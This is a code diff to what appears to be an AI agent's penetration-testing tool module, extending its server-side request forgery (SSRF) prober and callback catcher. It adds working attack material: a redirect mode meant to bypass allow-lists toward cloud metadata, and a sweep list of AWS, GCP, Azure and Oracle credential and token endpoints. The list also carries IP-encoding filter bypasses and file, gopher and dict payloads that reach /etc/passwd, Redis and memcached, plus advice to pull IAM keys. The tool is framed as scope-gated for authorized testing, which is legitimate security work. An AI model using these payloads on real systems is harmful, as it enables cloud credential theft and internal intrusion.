@@ -3726,57 +3726,140 @@ def tool_graphql(args: dict) -> str:
                        f"HTTP {code}\n{out}", 0, "host:urllib", target)
 
 
+_SSRF_DNS_SERVER = r'''
+import socket, datetime, sys
+LOG, PORT, ANSWER = sys.argv[1], int(sys.argv[2]), sys.argv[3]
+def qname(d):
+    # parse the question name starting at offset 12
+    i, parts = 12, []
+    while i < len(d):
+        n = d[i]
+        if n == 0:
+            break
+        parts.append(d[i+1:i+1+n].decode("latin-1", "replace")); i += n + 1
+    return ".".join(parts), i + 1
+s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+s.bind(("0.0.0.0", PORT))
+while True:
+    try:
+        data, addr = s.recvfrom(2048)
+        name, qend = qname(data)
+        open(LOG, "a").write(f"{datetime.datetime.now().isoformat()} DNS {name} from {addr[0]}\n")
+        # minimal A-record response: echo question + one answer pointing at ANSWER
+        tid = data[:2]
+        header = tid + b"\x81\x80\x00\x01\x00\x01\x00\x00\x00\x00"
+        question = data[12:qend+4]
+        octets = bytes(int(x) for x in ANSWER.split("."))
+        answer = b"\xc0\x0c\x00\x01\x00\x01\x00\x00\x00\x3c\x00\x04" + octets
+        s.sendto(header + question + answer, addr)
+    except Exception:
+        continue
+'''
+
+
 def tool_ssrf_catcher(args: dict) -> str:
-    """SSRF callback catcher. action=start stands up a loopback+docker-bridge HTTP
-    listener that logs every inbound request (method/path/headers/src) and returns a
-    callback URL to feed into SSRF sinks (containers reach the host at 172.17.0.1).
-    action=check greps the hit log (optional 'nonce' filter); action=stop kills it.
-    Your own listener, so not target-gated — the SSRF injection itself uses the
-    gated web/graphql/shell tools."""
+    """Out-of-band SSRF catcher — your own listeners for confirming blind SSRF.
+
+    HTTP (action=start): stands up an HTTP listener that logs every inbound request
+    (method/path/src/UA) and returns callback URLs to feed into SSRF sinks.
+    Containers reach the host at 172.17.0.1; the socket binds 0.0.0.0 by default so
+    both the docker bridge AND host loopback hit it (override with bind=127.0.0.1
+    for loopback-only). Because 0.0.0.0 also exposes the port on the tailnet/LAN,
+    the return value names the bind so you can firewall it if needed.
+      - redirect=<url>: instead of 200/ok, answer 302 Location:<url>. Feed the
+        catcher URL to a sink that validates the FIRST host then follows redirects,
+        pointing redirect= at 169.254.169.254 or another internal target — the
+        classic allow-list bypass the plain catcher can't do.
+    DNS (action=start_dns): stands up a tiny UDP DNS server that logs every queried
+    name and answers A. Confirms blind SSRF where HTTP egress is filtered but DNS
+    resolution is not. Point a hostname delegated to this box (NS -> here) at a
+    sink; any lookup lands in the log. Ports <1024 need root, so it defaults to 5354.
+
+    action=check / check_dns greps the hit log (optional 'nonce' filter);
+    action=stop / stop_dns kills the listener. Your own listeners, so not
+    target-gated — the SSRF injection itself uses the gated web/graphql/shell tools."""
     import os
     action = str(args.get("action") or "check").strip().lower()
-    port = int(args.get("port") or 9899)
+    port = int(args.get("port") or (5354 if "dns" in action else 9899))
+    bind = str(args.get("bind") or "0.0.0.0").strip()
+    redirect = str(args.get("redirect") or "").strip()
     sdir = os.path.expanduser("~/sygnif-pentest/ssrf")
     os.makedirs(sdir, exist_ok=True)
-    logf, pidf, srv = os.path.join(sdir, "hits.log"), os.path.join(sdir, "catcher.pid"), os.path.join(sdir, "catcher.py")
+    logf = os.path.join(sdir, "hits.log")
+    dlogf = os.path.join(sdir, "dns.log")
+    pidf = os.path.join(sdir, "catcher.pid")
+    dpidf = os.path.join(sdir, "dns.pid")
+    srv = os.path.join(sdir, "catcher.py")
+    dsrv = os.path.join(sdir, "dns_catcher.py")
+
     if action == "start":
+        # redirect mode → 302 to the given URL; else 200/ok. json.dumps embeds the
+        # bind/redirect safely as Python string literals in the generated server.
+        resp = (f"s.send_response(302); s.send_header('Location', {json.dumps(redirect)}); s.end_headers()"
+                if redirect else
+                "s.send_response(200); s.end_headers(); s.wfile.write(b'ok')")
         with open(srv, "w") as fh:
             fh.write(
                 "import http.server,datetime,sys\n"
-                "L=sys.argv[1]\n"
+                "L=sys.argv[1]; BIND=sys.argv[3] if len(sys.argv)>3 else '0.0.0.0'\n"
                 "class H(http.server.BaseHTTPRequestHandler):\n"
                 "  def _log(s):\n"
                 "    open(L,'a').write(f'{datetime.datetime.now().isoformat()} {s.command} {s.path} from {s.client_address[0]} UA={s.headers.get(\"User-Agent\",\"\")}\\n')\n"
-                "  def do_GET(s): s._log(); s.send_response(200); s.end_headers(); s.wfile.write(b'ok')\n"
-                "  def do_POST(s): s._log(); s.send_response(200); s.end_headers(); s.wfile.write(b'ok')\n"
+                f"  def do_GET(s): s._log(); {resp}\n"
+                f"  def do_POST(s): s._log(); {resp}\n"
                 "  def log_message(s,*a): pass\n"
-                "http.server.HTTPServer(('0.0.0.0',int(sys.argv[2])),H).serve_forever()\n")
-        out, rc = _run_host(f"nohup python3 {shlex.quote(srv)} {shlex.quote(logf)} {port} "
+                "http.server.HTTPServer((BIND,int(sys.argv[2])),H).serve_forever()\n")
+        out, rc = _run_host(f"nohup python3 {shlex.quote(srv)} {shlex.quote(logf)} {port} {shlex.quote(bind)} "
                             f">/dev/null 2>&1 & echo $!", 10)
         pid = out.strip().splitlines()[-1] if out.strip() else "?"
         open(pidf, "w").write(pid)
         nonce = "sg" + os.urandom(4).hex()
-        return (f"[ssrf-catcher started pid={pid} port={port}]\n"
+        expose = ("" if bind in ("127.0.0.1", "::1", "localhost")
+                  else f"\n⚠ bound {bind}:{port} — reachable on the tailnet/LAN too; firewall the port if that matters.")
+        mode = f"redirect->{redirect}" if redirect else "log-only (200 ok)"
+        return (f"[ssrf-catcher started pid={pid} bind={bind} port={port} mode={mode}]\n"
                 f"callback (from a container target): http://172.17.0.1:{port}/{nonce}\n"
                 f"callback (host loopback): http://127.0.0.1:{port}/{nonce}\n"
-                f"nonce={nonce} — put it in the path so you can tell hits apart. "
-                f"Then: ssrf_catcher(action=check, nonce={nonce}).")
-    if action == "stop":
+                + (f"redirect: every hit → 302 {redirect} (feed this to an allow-list-then-follow sink)\n" if redirect else "")
+                + f"nonce={nonce} — put it in the path so you can tell hits apart. "
+                f"Then: ssrf_catcher(action=check, nonce={nonce}).{expose}")
+
+    if action == "start_dns":
+        answer = str(args.get("answer") or "127.0.0.1").strip()
+        with open(dsrv, "w") as fh:
+            fh.write(_SSRF_DNS_SERVER)
+        out, rc = _run_host(f"nohup python3 {shlex.quote(dsrv)} {shlex.quote(dlogf)} {port} {shlex.quote(answer)} "
+                            f">/dev/null 2>&1 & echo $!", 10)
+        pid = out.strip().splitlines()[-1] if out.strip() else "?"
+        open(dpidf, "w").write(pid)
+        note = "" if port >= 1024 else "\n⚠ port <1024 needs root; if it didn't bind, rerun with a port ≥1024."
+        return (f"[ssrf-dns-catcher started pid={pid} udp port={port} answer={answer}]\n"
+                f"Point a hostname delegated to this host (NS record → this box:{port}) at the sink;\n"
+                f"every DNS lookup of it is logged even when HTTP egress is filtered.\n"
+                f"Check with: ssrf_catcher(action=check_dns).{note}")
+
+    if action in ("stop", "stop_dns"):
+        pf = dpidf if action == "stop_dns" else pidf
         try:
-            pid = open(pidf).read().strip()
+            pid = open(pf).read().strip()
             _run_host(f"kill {int(pid)} 2>/dev/null", 5)
-            return f"[ssrf-catcher stopped pid={pid}]"
+            return f"[{'ssrf-dns-catcher' if action=='stop_dns' else 'ssrf-catcher'} stopped pid={pid}]"
         except Exception as e:  # noqa: BLE001
-            return f"[ssrf-catcher stop: {e}]"
+            return f"[stop: {e}]"
+
+    # check / check_dns
+    target_log = dlogf if action == "check_dns" else logf
+    label = "ssrf-dns-catcher" if action == "check_dns" else "ssrf-catcher"
     nonce = str(args.get("nonce") or "").strip()
     try:
-        lines = open(logf).read().splitlines()
+        lines = open(target_log).read().splitlines()
     except OSError:
-        return "[no hits yet — catcher not started or nothing called back]"
+        return f"[no {label} hits yet — not started or nothing called back]"
     if nonce:
         lines = [x for x in lines if nonce in x]
     tail = lines[-40:]
-    return (f"[ssrf-catcher hits: {len(lines)}" + (f" matching {nonce}" if nonce else "") + "]\n"
+    return (f"[{label} hits: {len(lines)}" + (f" matching {nonce}" if nonce else "") + "]\n"
             + ("\n".join(tail) if tail else "(none)"))
 
 
@@ -3819,23 +3902,50 @@ def _http_send(method: str, url: str, headers: dict | None = None,
 # Built-in inner targets for an SSRF reachability sweep: the standard set that
 # confirms the sink reaches internal/link-local space you can't reach directly.
 _SSRF_INTERNAL = [
-    ("aws-imds",       "http://169.254.169.254/latest/meta-data/"),
-    ("aws-imds-creds", "http://169.254.169.254/latest/meta-data/iam/security-credentials/"),
-    ("gcp-metadata",   "http://metadata.google.internal/computeMetadata/v1/instance/"),
-    ("loopback",       "http://127.0.0.1/"),
-    ("loopback-name",  "http://localhost/"),
-    ("loopback-ipv6",  "http://[::1]/"),
-    ("loopback-dec",   "http://2130706433/"),          # 127.0.0.1 as a decimal int
-    ("docker-host",    "http://172.17.0.1/"),
+    # --- cloud instance metadata (the crown jewels of an SSRF) ---
+    ("aws-imds",        "http://169.254.169.254/latest/meta-data/"),
+    ("aws-imds-creds",  "http://169.254.169.254/latest/meta-data/iam/security-credentials/"),
+    ("aws-imdsv2-token","http://169.254.169.254/latest/api/token"),   # PUT-only; GET here 405 => IMDSv2 present
+    ("gcp-metadata",    "http://metadata.google.internal/computeMetadata/v1/instance/"),
+    ("gcp-token",       "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"),
+    ("azure-imds",      "http://169.254.169.254/metadata/instance?api-version=2021-02-01"),
+    ("azure-token",     "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"),
+    ("digitalocean",    "http://169.254.169.254/metadata/v1.json"),
+    ("oracle-oci",      "http://169.254.169.254/opc/v2/instance/"),
+    ("alibaba",         "http://100.100.100.200/latest/meta-data/"),
+    # --- loopback + name/scheme variants ---
+    ("loopback",        "http://127.0.0.1/"),
+    ("loopback-name",   "http://localhost/"),
+    ("loopback-ipv6",   "http://[::1]/"),
+    ("loopback-any",    "http://0.0.0.0/"),
+    ("docker-host",     "http://172.17.0.1/"),
+    # --- IP-encoding bypasses of a 127.0.0.1 string blocklist ---
+    ("enc-decimal",     "http://2130706433/"),                # 127.0.0.1 as a 32-bit int
+    ("enc-hex",         "http://0x7f000001/"),                # 127.0.0.1 in hex
+    ("enc-octal",       "http://0177.0.0.1/"),                # 127.0.0.1 with an octal octet
+    ("enc-short",       "http://127.1/"),                     # short form -> 127.0.0.1
+    ("enc-ipv4mapped",  "http://[::ffff:127.0.0.1]/"),        # IPv4-mapped IPv6
+    ("enc-imds-decimal","http://2852039166/latest/meta-data/"),  # 169.254.169.254 as a decimal int
+    # --- alternate schemes (sink must support them; carrier-dependent) ---
+    ("scheme-file",     "file:///etc/passwd"),                # local file read
+    ("scheme-gopher",   "gopher://127.0.0.1:6379/_INFO%0d%0a"),  # unauth internal Redis
+    ("scheme-dict",     "dict://127.0.0.1:11211/stats"),      # internal memcached banner
 ]
 
 
 def _ssrf_inner_headers(inner: str) -> dict:
-    """Provider quirks the sink must forward for the fetch to succeed."""
+    """Provider quirks the sink must forward for the fetch to succeed. These only
+    help when the SSRF carrier lets you set request headers the sink forwards;
+    many sinks strip them, but sending them costs nothing and turns a would-be
+    403/401 into real metadata when they do pass through."""
     h = {}
     low = inner.lower()
-    if "metadata.google.internal" in low or "169.254.169.254/computemetadata" in low:
-        h["Metadata-Flavor"] = "Google"
+    if "metadata.google.internal" in low or "computemetadata/v1" in low:
+        h["Metadata-Flavor"] = "Google"                 # GCP
+    if "/metadata/instance" in low or "/metadata/identity" in low:
+        h["Metadata"] = "true"                          # Azure IMDS
+    if "/opc/v2/" in low:
+        h["Authorization"] = "Bearer Oracle"            # Oracle OCI IMDSv2
     return h
 
 
@@ -3889,9 +3999,10 @@ def tool_ssrf(args: dict) -> str:
     or the default ?url=. Auth to the sink via token/cookie/auth_header/headers.
 
     mode=probe (default) sends one inner URL you give. mode=sweep walks a built-in
-    internal/link-local target list (AWS/GCP metadata, loopback, docker-host,
-    decimal-IP bypass) against the same sink and diffs each response against an
-    external control, flagging which internal targets the sink actually reached.
+    internal/link-local target list (AWS IMDSv1 + IMDSv2 detection, GCP/Azure/
+    DigitalOcean/Oracle/Alibaba metadata, loopback, docker-host, IP-encoding
+    bypasses, and file://gopher://dict:// schemes) against the same sink and diffs
+    each response against an external control, flagging which targets it reached.
     Scope-gated on the sink (target) via SCOPE.md + authorization, like every
     offensive tool. The inner URL is not scope-checked — that is the whole point of
     SSRF — so keep the sink itself in scope and the inner URLs to lab/own infra."""
@@ -3942,16 +4053,37 @@ def tool_ssrf(args: dict) -> str:
         ctrl_line, ctrl_st, ctrl_snip = _one("http://sygnif-ssrf-control.invalid/", "control")
         rows = [ctrl_line]
         reached = []
+        notes = []
+        seen = {}
         for label, inner in _SSRF_INTERNAL:
             line, st, snip = _one(inner, label)
             rows.append(line)
+            seen[label] = (st, snip)
             # a differing status or non-empty body vs the control = likely reached
             if st and (st != ctrl_st or (snip and snip != ctrl_snip)):
                 reached.append(f"{label} ({inner}) -> status {st}")
+        # AWS IMDSv2 vs v1: a 401/403 on the v1 data path while the token endpoint
+        # answers means IMDSv2 is enforced — a GET-only SSRF cannot mint the token
+        # (that needs a PUT to /latest/api/token), so v1 creds are NOT reachable
+        # blind. Say so instead of reporting a bare 401 as "blocked".
+        v1_st = seen.get("aws-imds", (0, ""))[0]
+        tok_st = seen.get("aws-imdsv2-token", (0, ""))[0]
+        if v1_st in (401, 403) and tok_st and tok_st != ctrl_st:
+            notes.append("AWS IMDSv2 appears ENFORCED (v1 data path "
+                         f"{v1_st}, token endpoint reachable): a GET-only SSRF can't mint the "
+                         "PUT token, so instance creds are out of reach unless the sink can issue "
+                         "a PUT (some proxies can) — try a carrier that controls the method.")
+        elif seen.get("aws-imds-creds", (0, ""))[1]:
+            notes.append("AWS IMDSv1 creds path returned a body — likely IMDSv1 open; pull "
+                         "iam/security-credentials/<role> for keys.")
+        if any(l.startswith("scheme-") for l, _ in _SSRF_INTERNAL):
+            notes.append("scheme-* rows depend on the sink's URL library; a connect-fail there "
+                         "usually means the scheme is unsupported, not that the service is down.")
         verdict = ("REACHED (differs from control): " + "; ".join(reached)) if reached else \
                   "no internal target clearly differed from control (sink may block, or is not an SSRF sink)"
         out = "SSRF reachability sweep vs external control\n\n" + "\n".join(rows) + \
               f"\n\nverdict: {verdict}\n" + \
+              ("".join(f"note: {n}\n" for n in notes)) + \
               "confirm blind hits separately with ssrf_catcher(action=check)."
         return _off_report("ssrf(sweep)", auth, f"{method} {target} <- internal sweep", out,
                            0, "host:urllib", target)
@@ -4336,12 +4468,12 @@ BUILTIN_TOOLS: dict[str, dict] = {
         "func": tool_graphql,
     },
     "ssrf_catcher": {
-        "desc": "SSRF callback listener: action=start (returns a callback URL for SSRF sinks; containers reach the host at 172.17.0.1), action=check (grep hits, optional nonce), action=stop. Your own listener; pair with the gated web/graphql tools to inject the callback.",
-        "args": {"action": "start | check | stop", "port": "listener port (default 9899)", "nonce": "filter hits by nonce (action=check)"},
+        "desc": "Out-of-band SSRF listeners. action=start (HTTP catcher; redirect=<url> makes it 302 to an internal target to bypass an allow-list-then-follow sink; bind=127.0.0.1 for loopback-only), action=start_dns (UDP DNS logger for blind SSRF when HTTP egress is filtered), action=check / check_dns (grep hits, optional nonce), action=stop / stop_dns. Your own listeners; pair with the gated web/graphql tools to inject the callback.",
+        "args": {"action": "start | start_dns | check | check_dns | stop | stop_dns", "port": "listener port (HTTP default 9899, DNS default 5354)", "redirect": "start: 302 every hit to this URL (allow-list bypass)", "bind": "start: bind address (default 0.0.0.0; 127.0.0.1 = loopback-only)", "answer": "start_dns: A-record IP to answer with (default 127.0.0.1)", "nonce": "filter hits by nonce (check)"},
         "func": tool_ssrf_catcher,
     },
     "ssrf": {
-        "desc": ("SSRF prober for an AUTHORIZED sink (fetcher/webhook/image-proxy/import-by-URL/CI-include). Injects an inner URL you control into the sink and reports its response. mode=probe (inner=<url>, e.g. your ssrf_catcher callback) or mode=sweep (built-in internal target list: AWS/GCP metadata, loopback, docker-host, decimal-IP bypass, diffed vs an external control). Carriers: body={{SSRF}} | field=<json key> | param=<query param> | default ?url=. Auth to the sink via token/cookie/auth_header. Scope-gated on target."),
+        "desc": ("SSRF prober for an AUTHORIZED sink (fetcher/webhook/image-proxy/import-by-URL/CI-include). Injects an inner URL you control into the sink and reports its response. mode=probe (inner=<url>, e.g. your ssrf_catcher callback) or mode=sweep (built-in internal target list: AWS IMDSv1+IMDSv2-detect, GCP/Azure/DigitalOcean/Oracle/Alibaba metadata, loopback, docker-host, IP-encoding bypasses (decimal/hex/octal/short/IPv4-mapped), and file://gopher://dict:// schemes, each diffed vs an external control). Carriers: body={{SSRF}} | field=<json key> | param=<query param> | default ?url=. Auth to the sink via token/cookie/auth_header. Scope-gated on target."),
         "args": {"target": "the sink URL you are authorized to test", "authorization": "attestation", "mode": "probe (default) | sweep", "inner": "URL the sink should fetch (mode=probe)", "param": "query param to inject into", "field": "JSON body key to inject into (POST)", "body": "raw body template with {{SSRF}} placeholder", "method": "GET (default) | POST", "nonce": "tag appended to inner for ssrf_catcher correlation", "token": "bearer token for the sink", "cookie": "cookie for the sink", "follow_redirects": "0 to not follow (see raw Location)"},
         "func": tool_ssrf,
     },
